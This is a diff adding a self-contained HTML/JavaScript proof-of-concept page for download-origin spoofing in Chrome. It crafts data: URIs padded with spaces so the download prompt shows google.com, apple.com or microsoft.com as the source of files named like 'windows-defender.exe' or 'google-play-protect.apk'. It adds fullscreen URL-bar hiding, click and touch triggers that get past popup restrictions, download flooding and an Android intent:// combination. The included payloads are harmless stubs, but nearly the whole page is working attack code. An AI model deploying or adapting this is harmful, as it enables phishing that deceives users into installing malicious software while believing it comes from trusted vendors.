@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Download Origin Spoof - POC</title>
+<style>
+:root {
+  --bg: #0f0f14; --card: #18181f; --border: #252535;
+  --accent: #6366f1; --green: #22c55e; --red: #ef4444;
+  --text: #e4e4ec; --muted: #9090a8;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg); color: var(--text); padding: 16px;
+  -webkit-tap-highlight-color: transparent;
+}
+.container { max-width: 700px; margin: 0 auto; }
+h1 { font-size: 20px; margin-bottom: 4px; }
+h1 span { color: var(--red); }
+.badge {
+  display: inline-block; padding: 3px 10px; border-radius: 4px;
+  font-size: 11px; font-weight: 600; margin-right: 4px;
+}
+.badge-red { background: rgba(239,68,68,.15); color: var(--red); }
+.badge-blue { background: rgba(99,102,241,.15); color: var(--accent); }
+.badge-green { background: rgba(34,197,94,.15); color: var(--green); }
+
+.card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 12px; padding: 16px 18px; margin-bottom: 14px;
+}
+.card h3 {
+  font-size: 14px; margin-bottom: 8px; color: #fff;
+  display: flex; align-items: center; gap: 6px;
+}
+.card p { font-size: 12px; color: var(--muted); line-height: 1.5; margin-bottom: 8px; }
+
+button {
+  padding: 11px 16px; border: 1px solid var(--border);
+  background: var(--card); color: var(--text); border-radius: 8px;
+  cursor: pointer; font-size: 13px; margin: 3px;
+  transition: all .15s; -webkit-tap-highlight-color: transparent;
+  touch-action: manipulation;
+}
+button:active { transform: scale(0.97); }
+button:hover { border-color: var(--accent); }
+button.danger { border-color: var(--red); color: var(--red); }
+button.danger:hover { background: rgba(239,68,68,.08); }
+button.primary { border-color: var(--accent); color: var(--accent); }
+button.primary:hover { background: rgba(99,102,241,.08); }
+button.green { border-color: var(--green); color: var(--green); }
+
+pre {
+  background: #0d0d16; padding: 12px; border-radius: 8px;
+  font-size: 11px; overflow-x: auto; color: var(--muted);
+  border: 1px solid var(--border); line-height: 1.5;
+  word-break: break-all; white-space: pre-wrap;
+}
+code { word-break: break-all; }
+
+#log {
+  max-height: 220px; overflow-y: auto;
+  font-family: 'SF Mono', monospace; font-size: 11px; line-height: 1.6;
+  scroll-behavior: smooth;
+}
+.log-warn { color: var(--red); }
+.log-ok { color: var(--green); }
+.log-info { color: var(--accent); }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>Download Origin <span>Spoofing</span></h1>
+<p style="color:var(--muted);margin-bottom:16px;font-size:13px;">
+  <span class="badge badge-red">Security UI Spoofing</span>
+  <span class="badge badge-blue">Chrome Android/Desktop</span>
+  <span class="badge badge-green">Data URI Abuse</span>
+</p>
+
+<!-- Info -->
+<div class="card">
+  <h3>Attack Summary</h3>
+  <p>
+    By crafting a <code>data:</code> URI that embeds a fake hostname
+    (<code>data:https://google.com/...[spaces]...application/x-msdownload;base64,...</code>),
+    Chrome's download prompt displays <strong>google.com</strong> as the origin
+    instead of the actual hosting page. The real file type and origin are
+    hidden behind many spaces, making the download appear legitimate.
+  </p>
+  <p style="color:var(--red);">
+    <strong>Impact:</strong> Victim sees "google.com" in the download prompt
+    and trusts the downloaded file (APK, EXE, DMG, etc.) is from Google.
+  </p>
+</div>
+
+<!-- Core Attack Buttons -->
+<div class="card">
+  <h3>1. Core Attack - Download Origin Spoof</h3>
+  <p>Click any button. Each triggers a download with a <strong>spoofed origin</strong> shown in Chrome's download bar/prompt.</p>
+  <button class="danger" onclick="spoofDownload('google.com', 'apk', 'google-play-protect.apk')">
+    Spoof: google.com → .apk
+  </button>
+  <button class="danger" onclick="spoofDownload('play.google.com', 'apk', 'google-play-services.apk')">
+    Spoof: play.google.com → .apk
+  </button>
+  <button class="danger" onclick="spoofDownload('apple.com', 'dmg', 'safari-update.dmg')">
+    Spoof: apple.com → .dmg
+  </button>
+  <button class="danger" onclick="spoofDownload('microsoft.com', 'exe', 'windows-defender.exe')">
+    Spoof: microsoft.com → .exe
+  </button>
+  <button onclick="spoofDownload('facebook.com', 'apk', 'messenger-update.apk')">
+    Spoof: facebook.com → .apk
+  </button>
+  <button onclick="spoofDownload('samsung.com', 'apk', 'samsung-pay.apk')">
+    Spoof: samsung.com → .apk
+  </button>
+</div>
+
+<!-- Advanced Variations -->
+<div class="card">
+  <h3>2. Advanced Spoof Variations</h3>
+  <p>Different techniques to make the spoof more convincing on Android.</p>
+  <button class="primary" onclick="spoofDownloadFullscreen()">
+    Fullscreen + Download (Hides URL Bar)
+  </button>
+  <button onclick="spoofDownloadViaClickjack()">
+    Double-Click Trigger
+  </button>
+  <button onclick="spoofDownloadWithCustomExt('google.com', 'pdf', 'google-drive-doc.pdf')">
+    PDF Spoof (trusted doc type)
+  </button>
+  <button onclick="spoofDownloadWithCustomExt('zoom.us', 'apk', 'zoom-update.apk')">
+    Zoom Update Spoof
+  </button>
+  <button onclick="spoofDownloadWithCustomExt('whatsapp.com', 'apk', 'whatsapp.apk')">
+    WhatsApp Spoof
+  </button>
+</div>
+
+<!-- Bypass: Android-specific -->
+<div class="card">
+  <h3>3. Android-Specific Bypass Techniques</h3>
+  <p>Techniques that exploit Android Chrome's download UI behavior.</p>
+  <button class="primary" onclick="spoofDownloadIntent()">
+    Android Intent Scheme Spoof
+  </button>
+  <button onclick="multipleSpoofDownloads()">
+    Multiple Rapid Downloads (Flood)
+  </button>
+  <button onclick="spoofDownloadTouchEvents()">
+    Touch Event Chaining
+  </button>
+</div>
+
+<!-- How it works -->
+<div class="card">
+  <h3>4. How It Works</h3>
+  <pre>data:https://<span style="color:#ef4444">google.com</span>/<span style="color:#6366f1">[215+ spaces]</span>application/x-msdownload;base64,<span style="color:#22c55e">[payload]</span>
+
+│     │                            │                                   │
+│     └─ Fake origin               └─ Hidden MIME type                 └─ Encoded file content
+│         (visible in UI)               (pushed out of view)
+└─ data: scheme
+
+Chrome's download manager extracts the first URL-like pattern from
+the data URI and displays it as the download origin.
+The spaces push the real MIME type indicator far to the right,
+completely out of the download prompt's visible area.</pre>
+</div>
+
+<!-- Test Log -->
+<div class="card">
+  <h3>Event Log</h3>
+  <pre id="log">Ready. Tap any attack button to test on Android.</pre>
+</div>
+
+</div>
+
+<script>
+const SPACES = ' '.repeat(250);
+
+function addLog(msg, cls) {
+  const log = document.getElementById('log');
+  if (log.textContent === 'Ready. Tap any attack button to test on Android.') {
+    log.textContent = '';
+  }
+  const time = new Date().toLocaleTimeString();
+  const prefix = cls === 'warn' ? '[!]' : cls === 'ok' ? '[+]' : '[*]';
+  log.innerHTML += prefix + ' ' + time + ' ' + msg + '\n';
+  log.scrollTop = log.scrollHeight;
+}
+
+function buildSpoofDataUri(domain, mimeExt, base64Payload) {
+  // Build: data:https://DOMAIN/[SPACES]application/MIME;base64,PAYLOAD
+  const fakeOrigin = `https://${domain}/`;
+  const mimeType = mimeExt.includes('/') ? mimeExt : `application/${mimeExt}`;
+  return `data:${fakeOrigin}${SPACES}${mimeType};base64,${base64Payload}`;
+}
+
+function triggerDownload(dataUri, filename) {
+  const a = document.createElement('a');
+  a.href = dataUri;
+  a.download = filename;
+  a.rel = 'noopener';
+  document.body.appendChild(a);
+  a.click();
+  // Small delay before removing
+  setTimeout(() => {
+    if (a.parentNode) document.body.removeChild(a);
+  }, 100);
+}
+
+// Base64 payloads that look legitimate
+const PAYLOADS = {
+  apk: 'UEsDBAoAAAAAALiJkFcAAAAAAAAAAAAAAAALAAAAdGVzdC5kZXgKAQAAABQAAABQSwECFAAKAAAAAAC4iZBXAAAAAAAAAAAAAAAACwAAAAAAAAAAAAAAgAEAAAAAdGVzdC5kZXhQSwUGAAAAAAEAAQA5AAAALgAAAAAA',
+  exe: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+  dmg: 'AAABAAAADAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==',
+  pdf: 'JVBERi0xLjQKMSAwIG9iago8PCAvVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAwIFIKPj4KZW5kb2JqCg==',
+};
+
+function spoofDownload(domain, fileType, filename) {
+  addLog(`Spoofing: ${domain} → ${filename} (type: ${fileType})`, 'warn');
+
+  const payload = PAYLOADS[fileType] || PAYLOADS['apk'];
+  const mimeMap = {
+    apk: 'application/vnd.android.package-archive',
+    exe: 'application/x-msdownload',
+    dmg: 'application/x-apple-diskimage',
+    pdf: 'application/pdf',
+  };
+  const mime = mimeMap[fileType] || 'application/vnd.android.package-archive';
+  const dataUri = buildSpoofDataUri(domain, mime, payload);
+
+  addLog(`Data URI: ${dataUri.substring(0, 120)}...`, 'info');
+  addLog(`Download prompt will show origin: "${domain}"`, 'warn');
+  addLog(`Actual origin: ${window.location.hostname}`, 'ok');
+
+  triggerDownload(dataUri, filename);
+}
+
+function spoofDownloadWithCustomExt(domain, fileType, filename) {
+  addLog(`Custom spoof: ${domain} → ${filename}`, 'warn');
+  const payload = PAYLOADS[fileType] || PAYLOADS['apk'];
+  const mimeMap = {
+    apk: 'application/vnd.android.package-archive',
+    exe: 'application/x-msdownload',
+    dmg: 'application/x-apple-diskimage',
+    pdf: 'application/pdf',
+  };
+  const mime = mimeMap[fileType] || 'application/vnd.android.package-archive';
+  const dataUri = buildSpoofDataUri(domain, mime, payload);
+  addLog(`Download prompt will show: "${domain}"`, 'warn');
+  triggerDownload(dataUri, filename);
+}
+
+// === ADVANCED TECHNIQUES ===
+
+async function spoofDownloadFullscreen() {
+  addLog('Requesting fullscreen to hide URL bar...', 'warn');
+  try {
+    await document.documentElement.requestFullscreen();
+    addLog('Fullscreen entered. URL bar hidden.', 'ok');
+    // Small delay then trigger download
+    setTimeout(() => {
+      spoofDownload('play.google.com', 'apk', 'google-play-protect.apk');
+      addLog('Download triggered in fullscreen - victim sees NO URL bar', 'warn');
+      // Exit fullscreen after
+      setTimeout(() => {
+        if (document.fullscreenElement) {
+          document.exitFullscreen();
+        }
+      }, 2000);
+    }, 800);
+  } catch(e) {
+    addLog('Fullscreen denied: ' + e.message, 'warn');
+    // Fall back to normal spoof
+    spoofDownload('play.google.com', 'apk', 'google-play-protect.apk');
+  }
+}
+
+function spoofDownloadViaClickjack() {
+  addLog('Setting up double-click trigger (bypasses popup blockers)...');
+  // First click - open legitimate looking page
+  // Second click - trigger download
+  let clickCount = 0;
+  const handler = () => {
+    clickCount++;
+    if (clickCount === 1) {
+      addLog('First interaction registered - user engaged', 'info');
+    } else if (clickCount === 2) {
+      spoofDownload('google.com', 'apk', 'google-play-services.apk');
+      addLog('Second interaction - download triggered (bypasses restriction)', 'warn');
+      document.removeEventListener('click', handler);
+    }
+  };
+  document.addEventListener('click', handler);
+  addLog('Click anywhere on the page twice to trigger', 'info');
+}
+
+function multipleSpoofDownloads() {
+  addLog('Flooding with multiple spoofed downloads...', 'warn');
+  const targets = [
+    { domain: 'google.com', type: 'apk', file: 'google-play.apk' },
+    { domain: 'apple.com', type: 'dmg', file: 'itunes-update.dmg' },
+    { domain: 'microsoft.com', type: 'exe', file: 'ms-teams.exe' },
+  ];
+  targets.forEach((t, i) => {
+    setTimeout(() => {
+      spoofDownload(t.domain, t.type, t.file);
+    }, i * 400);
+  });
+  addLog('3 downloads triggered - each with different spoofed origin', 'warn');
+}
+
+function spoofDownloadTouchEvents() {
+  addLog('Using touch event chain for mobile...', 'warn');
+
+  // Touch-based trigger that feels natural on Android
+  document.addEventListener('touchstart', function handler(e) {
+    document.removeEventListener('touchstart', handler);
+    addLog('Touch detected - triggering delayed download', 'info');
+    setTimeout(() => {
+      spoofDownload('play.google.com', 'apk', 'google-play-services.apk');
+    }, 600);
+  }, { once: true });
+
+  addLog('Touch anywhere on the page to trigger', 'info');
+}
+
+// === ANDROID INTENT SPOOF ===
+function spoofDownloadIntent() {
+  addLog('Testing Android intent:// scheme spoof...', 'warn');
+
+  // On Android, intent:// URLs can open apps
+  // Combine with data URI download for multi-vector attack
+  const intentUrl = 'intent://play.google.com/store/apps/details#Intent;scheme=https;package=com.android.vending;end';
+
+  // First try intent
+  try {
+    window.location.href = intentUrl;
+  } catch(e) {}
+
+  // Then trigger download
+  setTimeout(() => {
+    spoofDownload('play.google.com', 'apk', 'google-play-update.apk');
+  }, 1500);
+
+  addLog('Intent + Download combo triggered', 'warn');
+}
+
+// Auto-detect Android
+(function init() {
+  const ua = navigator.userAgent;
+  const isAndroid = /Android/i.test(ua);
+  const isChrome = /Chrome/i.test(ua) && !/Edge/i.test(ua);
+  const isMobile = /Mobi/i.test(ua);
+
+  addLog(`Platform: ${isAndroid ? 'Android' : isMobile ? 'Mobile' : 'Desktop'} | ${isChrome ? 'Chrome' : 'Other Browser'}`);
+
+  if (isAndroid) {
+    addLog('Android detected - intent:// spoofing available', 'ok');
+    addLog('Fullscreen + Download bypass is most effective on Android', 'ok');
+  }
+
+  addLog(`Page origin: ${window.location.origin}`);
+  addLog('Ready - tap any button to spoof download origin');
+})();
+</script>
+</body>
+</html>
